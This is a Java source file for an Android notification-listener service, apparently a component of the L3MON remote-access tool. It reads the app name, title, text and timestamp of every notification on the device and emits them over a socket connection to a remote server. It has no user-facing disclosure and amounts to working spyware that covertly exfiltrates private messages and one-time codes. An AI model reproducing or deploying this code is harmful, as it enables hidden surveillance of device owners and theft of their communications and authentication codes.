package com.etechd.l3mon;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.os.Build;
import android.os.IBinder;

import android.content.Intent;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import androidx.annotation.RequiresApi;

import com.example.commoninterfaces.IOSocket;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
@SuppressLint("OverrideAbstract")
public class NotificationListener extends NotificationListenerService {

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        try {
            String appName = sbn.getPackageName();
            String title = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
            }
            CharSequence contentCs = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            }
            String content = "";
            if(contentCs != null) content = contentCs.toString();
            long postTime = sbn.getPostTime();
            String uniqueKey = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT_WATCH) {
                uniqueKey = sbn.getKey();
            }

            JSONObject data = new JSONObject();
            data.put("appName", appName);
            data.put("title", title);
            data.put("content", "" + content);
            data.put("postTime", postTime);
            data.put("key", uniqueKey);
            new IOSocket(this).getIoSocket().emit("0xNO" , data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
